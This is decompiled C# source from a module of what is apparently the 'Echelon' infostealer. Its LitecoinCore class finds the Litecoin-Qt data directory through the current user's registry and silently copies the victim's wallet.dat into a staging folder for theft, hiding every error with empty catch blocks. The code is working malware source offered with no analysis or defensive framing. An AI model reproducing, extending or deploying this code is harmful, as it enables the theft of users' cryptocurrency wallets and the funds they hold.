using System;
using System.IO;
using Microsoft.Win32;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x0200000D RID: 13
	internal class LitecoinCore
	{
		// Token: 0x0600001F RID: 31 RVA: 0x00003668 File Offset: 0x00001868
		public static void LitecStr(string directorypath)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt"))
				{
					try
					{
						Directory.CreateDirectory(directorypath + "\\Wallets\\LitecoinCore\\");
						object value = registryKey.GetValue("strDataDir");
						File.Copy(((value != null) ? value.ToString() : null) + "\\wallet.dat", directorypath + "\\LitecoinCore\\wallet.dat");
						LitecoinCore.count++;
						Wallets.count++;
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000021 RID: 33
		public static int count;
	}
}
